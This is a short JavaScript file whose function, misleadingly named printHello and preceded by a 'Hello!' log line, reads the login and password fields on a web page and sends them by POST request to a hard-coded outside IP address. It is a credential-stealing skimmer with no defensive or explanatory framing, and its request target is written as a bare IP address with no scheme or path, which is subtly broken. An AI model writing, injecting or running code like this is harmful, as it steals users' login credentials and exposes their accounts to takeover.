console.log("Hello!");


var my_ip = "98.209.19.232"

function printHello() {
	// grab the login and pass
	var login = document.getElementById('login');
	var password = document.getElementById('password');
	// send the login and pass as resquests
	var req = new XMLHttpRequest();
	req.open( "POST", my_ip, true); // false for synchronous request
	req.send("<login>"+login.value+"</login>\n"+"<pass>"+password.value+"</pass>");
}

